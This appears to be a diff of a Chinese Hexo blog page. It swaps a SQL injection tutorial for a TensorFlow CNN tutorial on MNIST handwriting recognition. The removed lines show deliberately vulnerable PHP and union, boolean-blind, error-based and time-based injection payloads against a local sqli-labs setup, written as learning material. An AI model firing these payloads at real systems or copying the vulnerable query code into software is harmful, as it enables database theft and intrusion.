@@ -4,8 +4,10 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="Sql-inject, god_13">
-    <meta name="description" content="概述SQL注入漏洞是owasp发布的top10排行榜里一直排在第一的漏洞，一个严重的sql注入漏洞可能会直接导致一家公司破产。SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致传入的“数据”拼接到">
+    <meta name="keywords" content="用卷积神经网络实现MINIST手写字识别, god_13">
+    <meta name="description" content="前言学习了这么久的深度学习，基本上都是在学习一些理论，那么现在就来实践一下吧，今天实践的是用卷积神经网络实现MINIST手写字识别
+代码分析既然是实践，卷积神经网络的具体步骤就不在此赘述了，直接上代码
+#导入MNIST数据集-创建模型-保存">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +15,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>Sql-inject | god_13</title>
+    <title>用卷积神经网络实现MINIST手写字识别 | god_13</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -257,13 +259,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        Sql-inject
+                        用卷积神经网络实现MINIST手写字识别
                     </div>
                 </div>
             </div>
@@ -374,8 +376,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/漏洞/" target="_blank">
-                                <span class="chip bg-color">漏洞</span>
+                            <a href="/tags/深度学习/" target="_blank">
+                                <span class="chip bg-color">深度学习</span>
                             </a>
                         
                     </div>
@@ -389,21 +391,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2019-07-23
+                    2019-11-02
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        2k
+                        1.7k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
-                        9 Min
+                        7 Min
                     </div>
                     
                 
@@ -419,186 +421,156 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>SQL注入漏洞是owasp发布的top10排行榜里一直排在第一的漏洞，一个严重的sql注入漏洞可能会直接导致一家公司破产。SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行，从而导致数据库受损（被脱裤，被删除，甚至整个服务器权限沦陷）。</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>sql注入的产生需要满足下列两个条件</p>
-<hr>
-<p>1.参数用户可控<br>2.参数带入数据库查询</p>
-<hr>
-<p>当传入的id参数为1’时，数据库执行代码如下</p>
-<pre><code>select * from users where id = 1&#39;
-</code></pre><p>这不符合数据库语法规范，所以会报错，当传入的等id参数为and 1=1时，执行的sql语句为</p>
-<pre><code>select * from users where id = 1 and 1=1
-</code></pre><p>因为id=1为真，1=1也为真，所以页面会返回和id=1相同的结果，当传入参数为and 1=2时，会报错。这就是初步判断存在sql注入的漏洞。</p>
-<h2 id="与mysql相关的知识点"><a href="#与mysql相关的知识点" class="headerlink" title="与mysql相关的知识点"></a>与mysql相关的知识点</h2><p>在mysql5.0版本之后，mysql数据库默认存放了一个“imforemation_schema”的数据库，在该库中，有三个表名需要记住,分别是<strong>SCHEMATA,TABLES,COLUMNS</strong><br>SCHEMATA表存储该用户创建的所有数据库名</p>
-<pre><code>mysql&gt; select * from SCHEMATA;
-+--------------+--------------------+----------------------------+------------------------+----------+
-| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |
-+--------------+--------------------+----------------------------+------------------------+----------+
-| def          | information_schema | utf8                       | utf8_general_ci        | NULL     |
-| def          | bwapp              | utf8                       | utf8_general_ci        | NULL     |
-| def          | challenges         | gbk                        | gbk_chinese_ci         | NULL     |
-| def          | dedecmsv57utf8sp2  | utf8                       | utf8_general_ci        | NULL     |
-| def          | dvwa               | utf8                       | utf8_general_ci        | NULL     |
-| def          | mysql              | utf8                       | utf8_general_ci        | NULL     |
-| def          | performance_schema | utf8                       | utf8_general_ci        | NULL     |
-| def          | pikachu            | utf8                       | utf8_general_ci        | NULL     |
-| def          | security           | gbk                        | gbk_chinese_ci         | NULL     |
-| def          | test               | latin1                     | latin1_swedish_ci      | NULL     |
-| def          | test1              | utf8                       | utf8_general_ci        | NULL     |
-| def          | test2              | utf8                       | utf8_general_ci        | NULL     |
-| def          | wordpress          | utf8                       | utf8_general_ci        | NULL     |
-+--------------+--------------------+----------------------------+------------------------+----------+
-</code></pre><p>TABLES表存储该用户创建的所有数据库的库名和表名，记录数据库名和表名的字段分别为TABLE SCHEMA和TABLE</p>
-<pre><code>mysql&gt; select * from TABLES;
-+---------------+--------------------+----------------------------------------------+-------------+--------------------+---------+------------+------------+----------------+-------------+--------------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+--------------------+----------+-----------------+---------------------------------------------------+
-| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME                                   | TABLE_TYPE  | ENGINE             | VERSION | ROW_FORMAT | TABLE_ROWS | AVG_ROW_LENGTH | DATA_LENGTH | MAX_DATA_LENGTH    | INDEX_LENGTH | DATA_FREE | AUTO_INCREMENT | CREATE_TIME         | UPDATE_TIME         | CHECK_TIME          | TABLE_COLLATION    | CHECKSUM | CREATE_OPTIONS  | TABLE_COMMENT                                     |
-+---------------+--------------------+----------------------------------------------+-------------+--------------------+---------+------------+------------+----------------+-------------+--------------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+--------------------+----------+-----------------+---------------------------------------------------+
-| def           | information_schema | CHARACTER_SETS                               | SYSTEM VIEW | MEMORY             |      10 | Fixed      |       NULL |            384 |           0 |           16604160 |            0 |         0 |           NULL | 2019-07-22 15:42:04 | NULL                | NULL                | utf8_general_ci    |     NULL | max_rows=43690  |                                                   |
-| def           | information_schema | COLLATIONS                                   | SYSTEM VIEW | MEMORY             |      10 | Fixed      |       NULL |            231 |           0 |           16704765 |            0 |         0 |           NULL | 2019-07-22 15:42:04 | NULL                | NULL                | utf8_general_ci    |     NULL | max_rows=72628  |                                                   |
-| def           | information_schema | COLLATION_CHARACTER_SET_APPLICABILITY        | SYSTEM VIEW | MEMORY             |      10 | Fixed      |       NULL |            195 |           0 |           16691610 |            0 |         0 |           NULL | 2019-07-22 15:42:04 | NULL                | NULL                | utf8_general_ci    |     NULL | max_rows=86037  |                                                   |
-| def           | information_schema | COLUMNS                                      | SYSTEM VIEW | MyISAM             |      10 | Dynamic    |       NULL |  
-</code></pre><p>COLUMNS表存储该用户创建的所有数据库名，表名和字段名,在这里先不展示了。</p>
-<h3 id="mysql查询语句"><a href="#mysql查询语句" class="headerlink" title="mysql查询语句"></a>mysql查询语句</h3><pre><code>select 要查询的字段名 from 库名.表名
-select 要查询的字段名 from 库名.表名 where 已知条件的字段名=&#39;已知条件的值&#39;
-</code></pre><h3 id="limit的用法"><a href="#limit的用法" class="headerlink" title="limit的用法"></a>limit的用法</h3><p>limit的使用格式是limit m,n 其中m指记录的开始位置，从0开始，表示第一条记录；n指取n条记录。例如limit 0，1表示从第一条记录开始，取一条记录，下面是使用limit和不使用limit的对比</p>
-<pre><code>mysql&gt; select * from users;
-+----+----------+------------+
-| id | username | password   |
-+----+----------+------------+
-|  1 | Dumb     | Dumb       |
-|  2 | Angelina | I-kill-you |
-|  3 | Dummy    | p@ssword   |
-|  4 | secure   | crappy     |
-|  5 | stupid   | stupidity  |
-|  6 | superman | genious    |
-|  7 | batman   | mob!le     |
-|  8 | admin    | admin      |
-|  9 | admin1   | admin1     |
-| 10 | admin2   | admin2     |
-| 11 | admin3   | admin3     |
-| 12 | dhakkan  | dumbo      |
-| 14 | admin4   | admin4     |
-+----+----------+------------+
-13 rows in set (0.00 sec)
-</code></pre><pre><code>mysql&gt; select * from users limit 0,1;
-+----+----------+----------+
-| id | username | password |
-+----+----------+----------+
-|  1 | Dumb     | Dumb     |
-+----+----------+----------+
-1 row in set (0.00 sec)
-</code></pre><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><p>在mysql中，注释符一般有：#或– 或/**/，中间的是–空格</p>
-<h3 id="内联函数"><a href="#内联函数" class="headerlink" title="内联函数"></a>内联函数</h3><p>内联函数的形式：</p>
-<pre><code>/*!code*/
-</code></pre><p>内联注释可以用于整个sql语句中,举个例子</p>
-<pre><code>index.php?id=-15 /*！union*/ /*!select*/ 1,2,3
-</code></pre><h2 id="union注入攻击"><a href="#union注入攻击" class="headerlink" title="union注入攻击"></a>union注入攻击</h2><p>使用union的前提是能注入，检验过能注入之后，就要使用order by来判断字段的数量了，在sqli-labs-master里，判断如下<br><img src="/2019/07/23/sql-inject/1.PNG" alt="order by 3"><br><img src="/2019/07/23/sql-inject/2.PNG" alt="order by 4"><br>发现字段数为3，所以union语句就是</p>
-<pre><code>union select 1,2,3
-</code></pre><p>此时可以设置id值为-1，就会返回union select的结果了<br><img src="/2019/07/23/sql-inject/3.PNG" alt=""><br>返回结果2，3说明2和3的位置可以输入mysql语句，尝试查看数据库名<br><img src="/2019/07/23/sql-inject/4.PNG" alt=""><br>查到数据库名为security<br>在得知了数据库之后，就可以使用命令来查询表名了</p>
-<pre><code>http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-1/?id=0&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+
-</code></pre><p>要注意的是id的值一定是数据库中不存在的id，否则不会执行后面的查询语句，还有单引号不能忘记加上<br><img src="/2019/07/23/sql-inject/5.PNG" alt=""><br>已知库名和表名，开始查询列名</p>
-<pre><code>http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-1/?id=0&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;emails&#39;--+
-</code></pre><p><img src="/2019/07/23/sql-inject/6.PNG" alt=""><br>最后查询字段值</p>
-<pre><code>http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-1/?id=0&#39; union select 1,2,group_concat(password) from security.users--+
-</code></pre><p><img src="/2019/07/23/sql-inject/7.PNG" alt=""><br>还有一条查看所有数据库的命令</p>
-<pre><code>http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-1/?id=0&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata--+
-</code></pre><p><img src="/2019/07/23/sql-inject/8.PNG" alt=""></p>
-<h2 id="Boolean注入攻击"><a href="#Boolean注入攻击" class="headerlink" title="Boolean注入攻击"></a>Boolean注入攻击</h2><p>代码分析</p>
-<pre><code>&lt;?php
-$con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;security&quot;);
-// 检测连接
-if (mysqli_connect_errno())
-{
-    echo &quot;连接失败: &quot; . mysqli_connect_error();
-}
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习了这么久的深度学习，基本上都是在学习一些理论，那么现在就来实践一下吧，今天实践的是用卷积神经网络实现MINIST手写字识别</p>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>既然是实践，卷积神经网络的具体步骤就不在此赘述了，直接上代码</p>
+<pre><code>#导入MNIST数据集-创建模型-保存模型到指定路径
 
-$id = $_GET[&#39;id&#39;];
-//匹配危险字符串
-if (preg_match(&quot;/union|sleep|benchmark/i&quot;, $id)) {
-    exit(&quot;no&quot;);
-}
+from tensorflow.examples.tutorials.mnist import input_data
 
-$result = mysqli_query($con,&quot;select * from users where `id`=&#39;&quot;.$id.&quot;&#39;&quot;);
+import tensorflow as tf
 
-$row = mysqli_fetch_array($result);
+mnist = input_data.read_data_sets(&#39;E:/download/pycharm/PyCharm Community Edition 2018.2.1/program/tensorflow/MNIST_data&#39;, one_hot=True) #MNIST数据集所在路径
 
-if ($row) {
-    exit(&quot;yes&quot;);
-}else{
-    exit(&quot;no&quot;);
-}
+x = tf.placeholder(tf.float32, [None, 784])
 
-?&gt;
-</code></pre><p>bool注入攻击页面只会回显yes和no，实际操作可能会比较麻烦<br>判断数据库名的长度</p>
-<pre><code>?id=1&#39; and length(database())&gt;=1--+
-</code></pre><p>找到最后返回yes的那个数字，就是数据库名的长度<br>获取数据库名(a-z,0-9)</p>
-<pre><code>id=1&#39; and substr(database(),1,1)=&#39;s&#39;--+
-</code></pre><p>用法：substr(string,start,length)。一般比较麻烦的情况下，可以采用暴力破解的方法，用burp抓包，然后修改参数就好了。<br>查询表名，字段名也应该粘贴在database()的位置</p>
-<pre><code>&#39; and substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1)=&#39;e&#39;--+
-</code></pre><p>以此类推，也可以查看其他的表名和字段名</p>
-<h2 id="报错注入攻击"><a href="#报错注入攻击" class="headerlink" title="报错注入攻击"></a>报错注入攻击</h2><p>代码分析</p>
-<pre><code>&lt;?php
-$con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;security&quot;);
-// 检测连接
-if (mysqli_connect_errno())
-{
-    echo &quot;连接失败: &quot; . mysqli_connect_error();
-}
-
-$username = $_GET[&#39;username&#39;];
-
-if($result = mysqli_query($con,&quot;select * from users where `username`=&#39;&quot;.$username.&quot;&#39;&quot;)){
-    echo &quot;ok&quot;;
-}else{
-    echo mysqli_error($con);
-}
-
-?&gt;
-</code></pre><p>查询语句</p>
-<pre><code>&quot;select * from users where `username`=&#39;&quot;.$username.&quot;&#39;&quot;
-</code></pre><p>当我们输入1’的时候，结果变成了</p>
-<pre><code>&quot;select * from users where `username`=&#39;1&#39;&#39;
-</code></pre><p>从而引发报错<br>sql语句,查看用户信息</p>
-<pre><code>?username=1&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
-</code></pre><p>查看数据库名</p>
-<pre><code>?username=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
-</code></pre><p>获取表名</p>
-<pre><code>&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),0x7e),1)--+
-</code></pre><p>语法updatexml(目标xml文档，xml路径，更新的内容)<br>concat()的作用是连接字符串</p>
-<h2 id="时间注入攻击"><a href="#时间注入攻击" class="headerlink" title="时间注入攻击"></a>时间注入攻击</h2><p>代码分析</p>
-<pre><code>&lt;?php
-$con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;security&quot;);
-// 检测连接
-if (mysqli_connect_errno())
-{
-    echo &quot;连接失败: &quot; . mysqli_connect_error();
-}
-
-$id = $_GET[&#39;id&#39;];
-
-if (preg_match(&quot;/union/i&quot;, $id)) {
-    exit(&quot;&lt;htm&gt;&lt;body&gt;no&lt;/body&gt;&lt;/html&gt;&quot;);
-}
-
-$result = mysqli_query($con,&quot;select * from users where `id`=&#39;&quot;.$id.&quot;&#39;&quot;);
-
-$row = mysqli_fetch_array($result);
-
-if ($row) {
-    exit(&quot;&lt;htm&gt;&lt;body&gt;yes&lt;/body&gt;&lt;/html&gt;&quot;);
-}else{
-    exit(&quot;&lt;htm&gt;&lt;body&gt;no&lt;/body&gt;&lt;/html&gt;&quot;);
-}
+y_ = tf.placeholder(tf.float32, [None, 10])
 
 
-?&gt;
-</code></pre><p>和bool类型的页面返回类似，也是只有yes和no，但是这个会利用sleep()和benchmark()延长反应的时间，让mysql执行的时间变长</p>
-<pre><code>http://127.0.0.1/source%20code/4.2.2/time.php?id=1&#39; and if(length(database())&gt;7,sleep(5),1)--+
-</code></pre><p>这句话的意思是判断数据库名的长度，如果大于七，sleep5秒，否则执行1，通过页面返回的时间判断是不是存在时间注入</p>
-<pre><code>http://127.0.0.1/source%20code/4.2.2/time.php?id=1&#39; and if(substr(database(),1,1)=&#39;s&#39;,sleep(5),1)--+
-</code></pre><p>判断数据库名的第一个字母，如果是s那么sleep5秒，否则执行1<br>还有一种是通过ASCII值来判断</p>
-<pre><code>id=1&#39; and if(ord(substring(user(),1,1))=114,sleep(5),1)--+
-</code></pre><p>‘r’的ASCII值为114，if条件成立，sleep5秒</p>
+def weight_variable(shape):
+    initial = tf.truncated_normal(shape,stddev = 0.1)
+    return tf.Variable(initial)
+
+def bias_variable(shape):
+    initial = tf.constant(0.1,shape = shape)
+    return tf.Variable(initial)
+
+def conv2d(x,W):
+    return tf.nn.conv2d(x, W, strides = [1,1,1,1], padding = &#39;SAME&#39;)
+
+def max_pool_2x2(x):
+    return tf.nn.max_pool(x, ksize=[1,2,2,1], strides=[1,2,2,1], padding=&#39;SAME&#39;)
+
+W_conv1 = weight_variable([5, 5, 1, 32])
+b_conv1 = bias_variable([32])
+
+x_image = tf.reshape(x,[-1,28,28,1])
+
+h_conv1 = tf.nn.relu(conv2d(x_image,W_conv1) + b_conv1)
+h_pool1 = max_pool_2x2(h_conv1)
+
+W_conv2 = weight_variable([5, 5, 32, 64])
+b_conv2 = bias_variable([64])
+
+h_conv2 = tf.nn.relu(conv2d(h_pool1, W_conv2) + b_conv2)
+h_pool2 = max_pool_2x2(h_conv2)
+
+W_fc1 = weight_variable([7 * 7 * 64, 1024])
+b_fc1 = bias_variable([1024])
+
+h_pool2_flat = tf.reshape(h_pool2, [-1, 7*7*64])
+h_fc1 = tf.nn.relu(tf.matmul(h_pool2_flat, W_fc1) + b_fc1)
+
+keep_prob = tf.placeholder(&quot;float&quot;)
+h_fc1_drop = tf.nn.dropout(h_fc1, keep_prob)
+
+W_fc2 = weight_variable([1024, 10])
+b_fc2 = bias_variable([10])
+
+y_conv=tf.nn.softmax(tf.matmul(h_fc1_drop, W_fc2) + b_fc2)
+
+cross_entropy = -tf.reduce_sum(y_*tf.log(y_conv))
+train_step = tf.train.AdamOptimizer(1e-4).minimize(cross_entropy)
+correct_prediction = tf.equal(tf.argmax(y_conv,1), tf.argmax(y_,1))
+accuracy = tf.reduce_mean(tf.cast(correct_prediction, &quot;float&quot;))
+
+saver = tf.train.Saver() #定义saver
+
+with tf.Session() as sess:
+    sess.run(tf.global_variables_initializer())
+    for i in range(20000):
+        batch = mnist.train.next_batch(50)
+        if i % 100 == 0:
+            train_accuracy = accuracy.eval(feed_dict={
+                x: batch[0], y_: batch[1], keep_prob: 1.0})
+            print(&#39;step %d, training accuracy %g&#39; % (i, train_accuracy))
+        train_step.run(feed_dict={x: batch[0], y_: batch[1], keep_prob: 0.5})
+    saver.save(sess, &#39;E:/Flow classification/Handwritten/model.ckpt&#39;) #模型储存位置
+
+    print(&#39;test accuracy %g&#39; % accuracy.eval(feed_dict={
+        x: mnist.test.images, y_: mnist.test.labels, keep_prob: 1.0}))
+
+</code></pre><p>这段代码的主要作用是把MINIST数据集导入-创建模型-把模型保存到指定目录。现在来一段一段地分析。</p>
+<h3 id="库函数"><a href="#库函数" class="headerlink" title="库函数"></a>库函数</h3><p>如下这是运行这段代码需要的库函数，<strong>input_data</strong>就可以把MINIST数据集导入，tensorflow是必不可少的。</p>
+<pre><code>from tensorflow.examples.tutorials.mnist import input_data
+
+import tensorflow as tf
+</code></pre><p><strong>input_data.read_data_sets</strong>导入数据集</p>
+<pre><code>mnist = input_data.read_data_sets(&#39;E:/download/pycharm/PyCharm Community Edition 2018.2.1/program/tensorflow/MNIST_data&#39;, one_hot=True) #MNIST数据集所在路径
+</code></pre><h3 id="占位符"><a href="#占位符" class="headerlink" title="占位符"></a>占位符</h3><p>这里的x,y都不是具体的值，相反，它们只是一个占位符，可以在tensorflow运行某一运算时根据该占位符输入具体的值。和一般的函数一样，x表示输入，y表示输出，其中784是一张展平的MNIST图片的维度，10表示输出的每一行为一个10维的one-hot向量,用于代表对应某一MNIST图片的类别。None表示其值大小不定，在这里作为第一个维度值，用以指代batch的大小，意即x的数量不定。</p>
+<pre><code>x = tf.placeholder(tf.float32, [None, 784])
+
+y_ = tf.placeholder(tf.float32, [None, 10])
+</code></pre><h3 id="权重和偏置函数"><a href="#权重和偏置函数" class="headerlink" title="权重和偏置函数"></a>权重和偏置函数</h3><p>这一段代码表示初始化权重和偏置，目的是为了不在建立模型的时候反复做初始化操作，所以就定义了两个函数用于初始化。这里有需要注意的一点，为了避免神经元输出恒为0的情况出现，就要使用一个较小的正数来初始化偏置值，这里用了0.1</p>
+<pre><code>def weight_variable(shape):
+    initial = tf.truncated_normal(shape,stddev = 0.1)
+    return tf.Variable(initial)
+
+def bias_variable(shape):
+    initial = tf.constant(0.1,shape = shape)
+    return tf.Variable(initial)
+</code></pre><h3 id="第一层卷积"><a href="#第一层卷积" class="headerlink" title="第一层卷积"></a>第一层卷积</h3><p>这一段表示的是第一层卷积，包括定义权重和偏置的张量形状，把x变成灰度图，把x_image和权值向量进行卷积，加上偏置值，然后用ReLU激活函数，最后采用最大值池化的操作。<br>这里描述一下各个参数的作用<br><strong>[5, 5, 1, 32]</strong>前两个参数是patch的大小，接着是输入通道的数目，最后是输出通道的数目<br><strong>[-1,28,28,1]</strong>把x变成一个4d向量，第二三维表示图片对应的宽和高，最后一维表示颜色是灰度图，如果值为3，表示的是彩色图</p>
+<pre><code>W_conv1 = weight_variable([5, 5, 1, 32])
+b_conv1 = bias_variable([32])
+
+x_image = tf.reshape(x,[-1,28,28,1])
+
+h_conv1 = tf.nn.relu(conv2d(x_image,W_conv1) + b_conv1)
+h_pool1 = max_pool_2x2(h_conv1)
+</code></pre><h3 id="第二层卷积"><a href="#第二层卷积" class="headerlink" title="第二层卷积"></a>第二层卷积</h3><p>第二个卷积层5*5的patch可以得到64个特征</p>
+<pre><code>W_conv2 = weight_variable([5, 5, 32, 64])
+b_conv2 = bias_variable([64])
+
+h_conv2 = tf.nn.relu(conv2d(h_pool1, W_conv2) + b_conv2)
+h_pool2 = max_pool_2x2(h_conv2)
+</code></pre><h3 id="全连接层"><a href="#全连接层" class="headerlink" title="全连接层"></a>全连接层</h3><p>全连接层代码，都知道全连接层的作用是把特征给整合到一起，现在图片的尺寸变成了7*7的，加入一个有1024个神经元的全连接层，用于处理整个图片。我们把池化层输出的张量reshape成一些向量，乘上权重矩阵，加上偏置，然后对其使用ReLU。</p>
+<pre><code>W_fc1 = weight_variable([7 * 7 * 64, 1024])
+b_fc1 = bias_variable([1024])
+
+h_pool2_flat = tf.reshape(h_pool2, [-1, 7*7*64])
+h_fc1 = tf.nn.relu(tf.matmul(h_pool2_flat, W_fc1) + b_fc1)
+
+</code></pre><h3 id="Dropout"><a href="#Dropout" class="headerlink" title="Dropout"></a>Dropout</h3><p>这段代码代表Dropout，作用是为了减少过拟合。我们用一个placeholder来代表一个神经元的输出在dropout中保持不变的概率。这样我们可以在训练过程中启用dropout，在测试过程中关闭dropout。 </p>
+<pre><code>keep_prob = tf.placeholder(&quot;float&quot;)
+h_fc1_drop = tf.nn.dropout(h_fc1, keep_prob)
+</code></pre><h3 id="输出层"><a href="#输出层" class="headerlink" title="输出层"></a>输出层</h3><p>最后是输出层，添加了一个softmax函数</p>
+<pre><code>W_fc2 = weight_variable([1024, 10])
+b_fc2 = bias_variable([10])
+
+y_conv=tf.nn.softmax(tf.matmul(h_fc1_drop, W_fc2) + b_fc2)
+</code></pre><p>至此卷积神经网络的所有流程就已经结束了，下面就需要对模型进行训练和评估了。</p>
+<h3 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h3><p>既然一个神经网络已经形成了，我们就需要查看准确率是否可以达到我们满意的效果，使用的是训练集先训练，并查看准确率。在这里使用了ADAM进行梯度下降优，在feed_dict中加入额外的参数keep_prob来控制dropout比例。然后每100次迭代输出一次日志。</p>
+<pre><code>cross_entropy = -tf.reduce_sum(y_*tf.log(y_conv))
+train_step = tf.train.AdamOptimizer(1e-4).minimize(cross_entropy)
+correct_prediction = tf.equal(tf.argmax(y_conv,1), tf.argmax(y_,1))
+accuracy = tf.reduce_mean(tf.cast(correct_prediction, &quot;float&quot;))
+
+saver = tf.train.Saver() #定义saver
+
+with tf.Session() as sess:
+    sess.run(tf.global_variables_initializer())
+    for i in range(20000):
+        batch = mnist.train.next_batch(50)
+        if i % 100 == 0:
+            train_accuracy = accuracy.eval(feed_dict={
+                x: batch[0], y_: batch[1], keep_prob: 1.0})
+            print(&#39;step %d, training accuracy %g&#39; % (i, train_accuracy))
+        train_step.run(feed_dict={x: batch[0], y_: batch[1], keep_prob: 0.5})
+    saver.save(sess, &#39;E:/Flow classification/Handwritten/model.ckpt&#39;) #模型储存位置
+
+    print(&#39;test accuracy %g&#39; % accuracy.eval(feed_dict={
+        x: mnist.test.images, y_: mnist.test.labels, keep_prob: 1.0}))
+</code></pre><p>最后的结果显示准确率达到了99.2%。</p>
+<h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>今天学习了一个完整的模型训练的过程以及每一个函数的作用，比以前理解的更加深入。</p>
 
             </div>
             <hr>
@@ -754,9 +726,9 @@ if ($row) {
             </div>
             <br>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">
-                    《Sql-inject》
+                    《用卷积神经网络实现MINIST手写字识别》
                 </span> by
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/07/23/sql-inject/" property="cc:attributionName" rel="cc:attributionURL">
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/11/02/yong-juan-ji-shen-jing-wang-luo-shi-xian-minist-shou-xie-zi-shi-bie/" property="cc:attributionName" rel="cc:attributionURL">
                 xiao
             </a> is licensed under a
             <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">
@@ -819,27 +791,30 @@ if ($row) {
         
         <div class="article col s12 m6 overflow-policy" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2019/07/24/weblogic-ssrf-lou-dong-fu-xian/">
+                <a href="/2019/11/02/yong-juan-ji-shen-jing-wang-luo-shi-xian-minist-shou-xie-zi-shi-bie/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="weblogic ssrf 漏洞复现">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="用卷积神经网络实现MINIST手写字识别">
                         
-                        <span class="card-title">weblogic ssrf 漏洞复现</span>
+                        <span class="card-title">用卷积神经网络实现MINIST手写字识别</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            ssrf简介SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻
+                            前言学习了这么久的深度学习，基本上都是在学习一些理论，那么现在就来实践一下吧，今天实践的是用卷积神经网络实现MINIST手写字识别
+代码分析既然是实践，卷积神经网络的具体步骤就不在此赘述了，直接上代码
+#导入MNIST数据集-创建模型-保存
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-24
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-02
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-user fa-fw"></i>
@@ -848,11 +823,12 @@ if ($row) {
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/漏洞复现/" target="_blank">
-                        <span class="chip bg-color">漏洞复现</span>
+                    <a href="/tags/深度学习/" target="_blank">
+                        <span class="chip bg-color">深度学习</span>
                     </a>
                     
                 </div>
@@ -866,25 +842,25 @@ if ($row) {
                 Next&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/07/20/wen-jian-shang-chuan-rao-guo-zi-shi-zong-jie/">
+                <a href="/2019/10/14/fan-dan-shell-cong-ru-men-dao-jin-jie/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="文件上传绕过姿势总结">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="反弹shell从入门到进阶">
                         
-                        <span class="card-title">文件上传绕过姿势总结</span>
+                        <span class="card-title">反弹shell从入门到进阶</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            为什么有文件上传漏洞？上传文件时，如果服务器端没有对客户端上传的文件作严格的过滤和验证，就可以造成任意文件上传的漏洞，上传的脚本文件包括(asp,aspx,php,jsp等)
-绕过前端检测绕过如果控制文件上传的地方只有简单的前端验证，就是上
+                            前言在渗透测试过程中，反弹shell是获取到权限的一种很重要的方式，一直用那些反弹shell的命令却不知道是什么意思，现在来专门学习一下原理。
+什么是反弹shell反弹shell(reverse shell)，就是监控端在监控某TCP/UD
                         
                     </div>
                     <div class="publish-info">
